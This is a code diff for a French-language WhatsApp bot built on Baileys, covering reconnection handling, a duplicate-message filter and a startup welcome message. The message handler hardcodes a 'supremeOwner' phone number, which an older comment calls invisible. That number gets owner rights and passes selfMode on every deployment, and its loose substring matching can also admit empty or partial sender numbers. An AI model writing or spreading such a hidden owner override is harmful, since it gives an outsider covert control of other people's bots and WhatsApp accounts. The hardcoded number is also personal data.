@@ -91,6 +91,7 @@ const store = {
   loadMessage: async (jid, id) => store.messages.get(jid)?.get(id) || null
 };
 
+// Activation du bouclier anti-doublon
 const processedMessages = new Set();
 setInterval(() => processedMessages.clear(), 5 * 60 * 1000); 
 
@@ -116,6 +117,7 @@ async function startBot() {
     syncFullHistory: false,
     downloadHistory: true, 
     markOnlineOnConnect: true,
+    keepAliveIntervalMs: 30000, // Laisse Baileys gérer la stabilité de la connexion
     getMessage: async (key) => {
       if (store) {
         const msg = await store.loadMessage(key.remoteJid, key.id);
@@ -150,37 +152,30 @@ async function startBot() {
     }
   }
 
-  let lastActivity = Date.now();
-  const INACTIVITY_TIMEOUT = 30 * 60 * 1000; 
-
-  sock.ev.on('messages.upsert', () => { lastActivity = Date.now(); });
-
-  const watchdogInterval = setInterval(async () => {
-    if (Date.now() - lastActivity > INACTIVITY_TIMEOUT && sock.ws.readyState === 1) { 
-      await sock.end(undefined, undefined, { reason: 'inactive' });
-      clearInterval(watchdogInterval);
-      setTimeout(() => startBot(), 5000); 
-    }
-  }, 5 * 60 * 1000); 
+  // SUPPRESSION DU WATCHDOG INTERVAL ICI (Il causait le clonage du bot)
 
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect } = update;
 
     if (connection === 'close') {
-      clearInterval(watchdogInterval);
-      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-      if (shouldReconnect) setTimeout(() => startBot(), 3000);
+      const statusCode = lastDisconnect?.error?.output?.statusCode;
+      const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+      
+      if (shouldReconnect) {
+        console.log('🔄 Reconnexion des circuits en cours...');
+        setTimeout(() => startBot(), 3000);
+      } else {
+        console.log('❌ Session déconnectée manuellement. Veuillez rescanner/réassocier.');
+      }
     } else if (connection === 'open') {
-      lastActivity = Date.now();
-
       const ownerNames = Array.isArray(config.ownerName) ? config.ownerName.join(', ') : config.ownerName;
       const botNumber = sock.user.id.split(':')[0];
 
-            // 1. AFFICHAGE ÉPURÉ DANS LA CONSOLE
+      // 1. AFFICHAGE ÉPURÉ DANS LA CONSOLE
       console.log('╭╼━≪• ɢʜᴏsᴛɢ-𝐗 ɪs ᴀʟɪᴠᴇ •≫━╾╮');
       console.log('╰━━━━━━━━━━━━━━━━━━━━━━━╯');
 
-      // 2. MESSAGE DE BIENVENUE WHATSAPP (100% STYLE CHEVALIER)
+      // 2. MESSAGE DE BIENVENUE WHATSAPP
       const bigWelcomeMessage = 
           `╭╼━≪• *ɢʜᴏsᴛɢ-𝐗 ɪs ᴀʟɪᴠᴇ* •≫━╾╮\n` +
           `┃ 🔮 *ᴠɪɢɪʟᴀɴᴄᴇ* : 🟢 ᴇ́ᴠᴇɪʟʟᴇ́\n` +
@@ -198,34 +193,26 @@ async function startBot() {
 
       try {
         const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
-        const path = require('path');
-        const fs = require('fs');
-        
-        // Puisque utils est à la racine, on part du dossier de travail actuel
         const imagePath = path.join(process.cwd(), 'utils', 'bot_image_6.jpg');
 
         if (fs.existsSync(imagePath)) {
           const imageBuffer = fs.readFileSync(imagePath);
-          
-          // Envoi de l'image avec le texte complet dans le Inbox de l'owner
-          await sock.sendMessage(myJid, { 
-            image: imageBuffer, 
-            caption: bigWelcomeMessage 
-          });
-          console.log('✉️ Image et message de démarrage scellés envoyés sur ton WhatsApp !');
+          await sock.sendMessage(myJid, { image: imageBuffer, caption: bigWelcomeMessage });
+          console.log('✉️ Message de démarrage scellé envoyé !');
         } else {
-          // Secours si l'image n'est pas trouvée
           await sock.sendMessage(myJid, { text: bigWelcomeMessage });
-          console.log('✉️ Message de démarrage envoyé en texte seul (image 6 introuvable dans utils).');
+          console.log('✉️ Message envoyé en texte seul (image introuvable).');
         }
       } catch (err) {
-        console.log('⚠️ Impossible d\'envoyer le message de démarrage sur WhatsApp.');
+        console.log('⚠️ Impossible d\'envoyer le message de démarrage.');
       }
 
       // 3. MISE À JOUR DE L'AUTOBIO
       if (config.autoBio) {
-        await sock.updateProfileStatus(`*ɢʜᴏsᴛɢ-𝐗* | *♛ᴊᴇsᴜs ᴇsᴛ ʀᴏɪ♛*`);
-                  }
+        try {
+          await sock.updateProfileStatus(`*ɢʜᴏsᴛɢ-𝐗* | *♛ᴊᴇsᴜs ᴇsᴛ ʀᴏɪ♛*`);
+        } catch (e) {}
+      }
 
       handler.initializeAntiCall(sock);
     }
@@ -243,30 +230,35 @@ async function startBot() {
       const from = msg.key.remoteJid;
       if (!from || isSystemJid(from)) continue;
 
-      // ── GESTION ROBUSTE DU SELFMODE (FIXÉ ET SÉCURISÉ) ──
-      const senderJid = msg.key.participant || msg.key.remoteJid;
-      const senderNumber = senderJid.replace(/\D/g, ''); 
-      
-      // 🛡️ TON NUMÉRO SUPREME OWNER INVISIBLE
+      // 🛡️ APPLICATION EFFECTIVE DU BOUCLIER ANTI-DOUBLON
+      if (processedMessages.has(msg.key.id)) continue;
+      processedMessages.add(msg.key.id);
+
+      // ── GESTION ROBUSTE DU SELFMODE ET DE L'IDENTIFICATION ──
+      // Fix: Récupère l'ID réel même si le message vient de toi dans un groupe
+      const senderJid = msg.key.fromMe ? sock.user.id : (msg.key.participant || msg.key.remoteJid);
+      const senderNumber = senderJid ? senderJid.split(':')[0].replace(/\D/g, '') : '';
+
       const supremeOwner = '22651622652';
       const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
-            // 👑 RÉACTION SUPRÊME AUTOMATIQUE
+      
+      // 👑 RÉACTION SUPRÊME AUTOMATIQUE
       if (isSupremeOwner) {
         try {
           await sock.sendMessage(from, { react: { text: '👑', key: msg.key } });
-        } catch (e) { /* On ignore l'erreur si l'envoi échoue */ }
+        } catch (e) { /* On ignore si échec */ }
       }
-      
+
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
-                     
+
       const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
-      // Si selfMode est actif, le bot n'écoute que le proprio du .env ET TOI en bypass
+      // Si selfMode est actif, le bot n'écoute QUE toi
       if (config.selfMode && !isMe) continue;
-      
+
       const MESSAGE_AGE_LIMIT = 5 * 60 * 1000; 
       if (msg.messageTimestamp) {
         const messageAge = Date.now() - (msg.messageTimestamp * 1000);
